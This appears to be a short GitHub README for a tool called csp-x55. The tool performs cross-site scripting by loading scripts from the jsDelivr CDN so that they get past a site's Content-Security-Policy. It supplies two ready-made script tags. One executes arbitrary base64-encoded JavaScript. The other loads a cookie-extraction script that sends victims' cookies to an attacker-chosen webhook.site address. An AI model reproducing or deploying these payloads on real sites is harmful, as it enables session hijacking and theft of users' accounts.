# csp-x55
XSS by bypassing Content-Security-Policy through CDN.



Example usage using `alert('xss');` in base64 `YWxlcnQoJ3hzcycpOw==`
```html
<script src="https://cdn.jsdelivr.net/gh/gramthanos/csp-x55@b983bf3b472cbe70c18209ac35ccb80bf73ca2d4/x55.js?c=YWxlcnQoJ3hzcycp">
```

```html
<script src="https://cdn.jsdelivr.net/gh/gramthanos/csp-x55@766f06154617964de53410b6aa7ff02459b4925e/extract-c00kies.js" r="https://webhook.site/youridhere"></script>
```
